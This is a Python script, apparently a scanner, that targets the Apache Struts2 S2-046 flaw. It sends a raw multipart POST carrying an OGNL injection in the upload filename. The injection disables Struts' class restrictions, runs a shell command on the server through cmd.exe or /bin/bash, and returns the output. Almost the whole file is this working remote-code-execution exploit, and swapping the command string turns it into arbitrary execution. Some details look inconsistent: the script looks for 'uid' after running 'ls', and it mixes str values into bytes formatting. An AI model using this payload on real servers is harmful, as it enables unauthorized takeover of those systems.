#encoding:utf-8
try:
    import sys, socket,os,logging
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')

class VulTest:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def Test(self):
        q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
                Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}x00b"
                Content-Type: text/plain

                foo
                ------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
        p = b'''POST / HTTP/1.1
Host: %s:%s
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (self.ip, str(self.port), len(q),)

        # with socket.create_connection((self.ip, str(self.port)), timeout=5) as conn:
        try:
            conn = socket.create_connection((self.ip, str(self.port)), timeout=3)
        except Exception as e:
            logging.info("[*] {} ".format(e))
            os._exit(4)
        try:
            conn.send(p + q)
            req = conn.recv(10240)
            # print req
            if (b'uid' in req):
                logging.info('[+] Found S2-046 in ' + self.ip + ':' + self.port)
                os._exit(1)
            else:
                logging.info('[-] S2-046 Not Found in ' + self.ip + ':' + self.port)
                os._exit(2)
        except Exception as e:
            logging.info("[*] {}".format(e))
            os._exit(3)

if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    # url = '192.168.136.130'
    test = VulTest(ip, port)
    
    test.Test()
